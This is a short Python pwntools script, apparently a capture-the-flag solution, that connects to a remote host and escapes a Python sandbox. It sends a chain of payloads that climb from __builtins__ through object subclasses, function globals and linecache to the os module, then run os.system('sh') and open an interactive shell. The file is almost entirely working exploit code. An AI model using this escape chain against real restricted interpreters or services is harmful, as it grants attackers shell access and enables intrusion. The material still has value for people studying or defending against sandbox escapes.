
from pwn import *

r = remote('54.37.70.250', 15006)

def sender(r,e):
    print('envoi de ...',e)
    r.sendline(e.encode())
    recept=r.recvuntil('\n'.encode())
    recept=recept.decode()
    print(recept)
    return
        

a = "__builtins__['a']=__builtins__"
b = "a['b']=().__class__.__base__"
c = "a['c']=b.__subclasses__()[59]"
d = "a['d']=c.__enter__.__func__"
e = "a['e']=d.__globals__"
f = "a['f']=e['linecache']"
g = "a['g']=f.checkcache"
h = "a['h']=g.__globals__"
i = "a['os']=h['os']"
j = "os.system('sh')"

if __name__== __name__:
    recept=r.recvuntil('\n'.encode())
    recept=recept.decode()
    print(recept)
    sender(r,a)
    sender(r,b)
    sender(r,c)
    sender(r,d)
    sender(r,e)
    sender(r,f)
    sender(r,g)
    sender(r,h)
    sender(r,i)
    r.sendline(j.encode())
    r.interactive()
    


